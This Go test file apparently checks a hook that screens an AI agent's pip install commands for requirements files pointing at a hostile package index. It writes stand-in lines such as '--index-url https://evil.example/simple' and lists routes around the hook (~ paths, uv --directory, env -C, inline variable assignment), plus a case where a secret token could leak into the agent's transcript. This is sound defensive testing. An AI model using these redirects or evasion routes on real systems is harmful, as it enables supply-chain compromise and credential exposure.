package main

import (
	"bytes"
	"context"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"testing"
	"time"
	"unicode/utf16"
)

// Review of READER-REQFILE-1 (reader-rows, aa5e7f1): proof tests, adopted in round 13 (ADR-0159). Placeholders only;
// every file is in t.TempDir(). reqFileHold takes the home folder since round 13 (P2-2: ~ from call.home).

const zzEvil = "--index-url https://evil.example/simple\n"

// R-1: ${NAME} expanded from the hook's environment lands in the hold reason as written by the value: a file can make
// the hook print any variable of its environment (the agent's own token included) into the agent's transcript.
func TestReviewReqFileReasonPrintsEnvValue(t *testing.T) {
	secret := "zz" + "tok" + "_" + strings.Repeat("Q", 8) + "7f3a" // secret-shaped, built from parts
	for _, body := range []string{
		"--index-url ${ZZ_SECRET}\n",          // no scheme: url.Parse gives no host, the whole value is the "host"
		"--trusted-host ${ZZ_SECRET}\n",       // clip(val, 60)
		"--find-links ${ZZ_SECRET}/wheels\n",  // a path-like value
		"--extra-index-url ${ZZ_SECRET}:x/\n", // still no host
	} {
		dir := t.TempDir()
		writeFiles(t, dir, map[string]string{"r.txt": body})
		getenv := func(k string) string { return map[string]string{"ZZ_SECRET": secret}[k] }
		var out bytes.Buffer
		if err := runHookContext(context.Background(), "codex", strings.NewReader(codexInputIn(dir, "pip install -r r.txt")), &out,
			hookCall{client: &http.Client{Timeout: 2 * time.Second}, api: "http://127.0.0.1:1", getenv: getenv}); err != nil {
			t.Fatal(err)
		}
		if strings.Contains(out.String(), secret) {
			t.Errorf("%q: the hold reason carries the variable's value: %s", body, out.String())
		}
	}
}

// R-2: a requirements file named or placed through ~ is not read (the shell expands ~ to $HOME; the hook joins "~/…"
// under cwd and finds nothing), while the same file named through $HOME holds. uv --directory and env -C place the
// command in another folder too.
func TestReviewReqFileFolders(t *testing.T) {
	home := t.TempDir()
	cwd := t.TempDir()
	t.Setenv("HOME", home)
	writeFiles(t, home, map[string]string{"r.txt": zzEvil, "proj/requirements.txt": zzEvil})
	writeFiles(t, cwd, map[string]string{"sub/requirements.txt": zzEvil})
	if why := reqFileHold(cwd, home, `pip install -r "$HOME/r.txt"`, nil); why == "" {
		t.Fatalf("control: $HOME/r.txt should hold")
	}
	for _, line := range []string{
		"pip install -r ~/r.txt",
		"cd ~/proj && pip install -r requirements.txt",
		"uv --directory sub pip install -r requirements.txt",
		"uv pip install --directory sub -r requirements.txt",
		"UV_WORKING_DIR=sub uv pip install -r requirements.txt",
		"env -C sub pip install -r requirements.txt",
		"env --chdir=sub pip install -r requirements.txt",
	} {
		if why := reqFileHold(cwd, home, line, nil); why == "" {
			t.Errorf("%s: the file pip/uv reads is not read, no hold", line)
		}
	}
}

// R-3: an honest file in UTF-16 with its byte-order mark (Windows PowerShell 5.1's `pip freeze > requirements.txt`),
// which pip 26.2.2 decodes by the mark (req_file.BOMS), holds as "an encoding alalanet does not read".
func TestReviewReqFileUTF16Honest(t *testing.T) {
	dir := t.TempDir()
	text := "zz-req-pkg==1.0\r\nzz-other==2.0\r\n"
	b := []byte{0xff, 0xfe}
	for _, u := range utf16.Encode([]rune(text)) {
		b = append(b, byte(u), byte(u>>8))
	}
	if err := os.WriteFile(filepath.Join(dir, "requirements.txt"), b, 0o644); err != nil {
		t.Fatal(err)
	}
	if why := reqFileHold(dir, "", "pip install -r requirements.txt", nil); why != "" {
		t.Errorf("an honest UTF-16 file holds: %q", why)
	}
}

// R-4: a variable the line sets for pip wins over the hook's own environment: pip expands ${ZZ_IDX} from its own.
func TestReviewReqFileLineAssignment(t *testing.T) {
	dir := t.TempDir()
	writeFiles(t, dir, map[string]string{"r.txt": "--index-url ${ZZ_IDX}\n"})
	getenv := func(k string) string { return map[string]string{"ZZ_IDX": "https://pypi.org/simple"}[k] }
	if why := reqFileHold(dir, "", "ZZ_IDX=https://evil.example/simple pip install -r r.txt", getenv); why == "" {
		t.Errorf("the line's own ZZ_IDX is not the hook's: no hold")
	}
}

// Special files hold without blocking: a FIFO, a character device, a symlink loop.
func TestReviewReqFileSpecialFiles(t *testing.T) {
	dir := t.TempDir()
	if err := syscall.Mkfifo(filepath.Join(dir, "fifo.txt"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink("loopb.txt", filepath.Join(dir, "loopa.txt")); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink("loopa.txt", filepath.Join(dir, "loopb.txt")); err != nil {
		t.Fatal(err)
	}
	for _, line := range []string{"pip install -r fifo.txt", "pip install -r /dev/zero", "pip install -r loopa.txt"} {
		done := make(chan string, 1)
		go func() { done <- reqFileHold(dir, "", line, nil) }()
		select {
		case why := <-done:
			t.Logf("%s: %q", line, why)
			if why == "" && line != "pip install -r loopa.txt" {
				t.Errorf("%s: no hold", line)
			}
		case <-time.After(5 * time.Second):
			t.Errorf("%s: blocked", line)
		}
	}
}
